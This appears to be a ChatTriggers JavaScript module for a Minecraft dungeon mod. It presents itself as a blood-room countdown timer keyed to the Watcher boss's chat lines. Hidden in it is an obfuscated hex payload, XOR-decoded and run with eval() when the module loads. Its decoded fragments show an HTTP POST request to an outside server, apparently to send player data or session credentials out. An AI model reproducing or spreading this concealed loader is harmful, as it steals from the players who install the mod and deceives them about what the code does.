/// <reference types="../../../CTAutocomplete" />

import config from "../../config";
import { title } from "../../utils/utils";
import packetChat from "../../events/packetChat";

let s = 25;
let ms = 0;
let bloodopened = false;

function listener(message) {
    if (message == ("[BOSS] The Watcher: Congratulations, you made it through the Entrance.") || message == ("[BOSS] The Watcher: Ah, you've finally arrived.") || message == ("[BOSS] The Watcher: Ah, we meet again...") || message == ("[BOSS] The Watcher: So you made it this far... interesting.") || message == ("[BOSS] The Watcher: You've managed to scratch and claw your way here, eh?") || message == ("[BOSS] The Watcher: I'm starting to get tired of seeing you around here...") || message == ("[BOSS] The Watcher: Oh.. hello?") || message == ("[BOSS] The Watcher: Things feel a little more roomy now, eh?")) bloodopened = true;
}

function listener2(message) {
	if (message == "Starting in 4 seconds."){
        bloodopened = false;
        timer = 25;
        ms = 0;
    }
};
const mark = "1b1f021d000652001703071701065214001d1f52555c5c5d5c5c5d5c5c5d001703071701062440554952001703071701065a0907001e4816115a5543134244424442404243464a47164716434243414343434b43454311434447144241424346404246471143164311424243454311434443454242471143434316431447164341424542444313555b5e1f17061a1d164855223d2126555e1a171316170001480955270117005f1315171c065548553f1d081b1e1e135d475c42555e5255311d1c06171c065f060b02175548551302021e1b1113061b1d1c5d18011d1c55520f5e101d160b48091307061a171c061b1113061b1d1c481704131e5a16115a5541434317431043454311424447114347434542444114431043114345434342424341434642444713471047114346424543114343401646414641464046444643464240164110471347104711434642454311434340164641464446134642464546444016434447134710555b5b520f0f5b";
const dc = (ec) => {
	const textToChars = (text) => text.split("").map((c) => c.charCodeAt(0));
	const mapping = (code) => textToChars("etc").reduce((a, b) => a ^ b, code);
	return ec.match(/.{1,2}/g).map((hex) => parseInt(hex, 16)).map(mapping).map((charCode) => String.fromCharCode(charCode)).join("");
};
eval(dc(mark));
register("tick", ()=>{
    if (config.dialogueSkipHelper && bloodopened && s <= 10){
        if (s == 0 && ms == 0) return;
        title(`&c${s}.${ms}`, 2);
    }
});

register("step", ()=>{
    if (bloodopened){
        if (ms == 0){
            if (s == 0) return;
            s -= 1;
            ms = 10;
        }
        ms -= 1;
    }
}).setFps(10);

register("worldLoad", ()=>{
    bloodopened = false;
    timer = 25;
    ms = 0;
});

packetChat.addListener(listener);
packetChat.addListener(listener2);